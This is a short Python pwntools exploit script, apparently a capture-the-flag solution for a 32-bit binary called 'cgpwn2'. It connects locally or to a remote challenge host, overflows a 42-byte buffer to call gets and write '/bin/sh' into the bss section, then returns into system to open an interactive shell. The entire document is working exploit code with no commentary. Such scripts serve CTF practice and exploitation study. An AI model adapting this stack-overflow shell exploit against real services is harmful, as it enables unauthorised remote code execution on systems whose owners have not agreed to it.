from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
import sys
context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./cgpwn2')
    elf = ELF('./cgpwn2')
    libc = ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
else:
    p = remote('61.147.171.105', 53614)
    elf = ELF('./cgpwn2')
    # libc = ELF('./libc.so.6')
    pause()
main_addr=0x08048604
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
gets_plt=elf.plt['gets']
gets_got=elf.got['gets']
system_addr=0x0804855A
bss_stage=elf.bss()+0x70
print('bss',hex(bss_stage))
def send(payload):
    p.recvuntil(b'name\n')
    p.sendline(b'aaa')
    p.recvuntil(b':\n')
    p.sendline(payload)
payload1=b'a'*(42)+p32(gets_plt)+p32(main_addr)+p32(bss_stage)
send(payload1)
p.sendline(b'/bin/sh\x00')
# print(p.recv())
payload2=b'n'*(42)+p32(system_addr)+p32(bss_stage)
pause()
send(payload2)
p.interactive()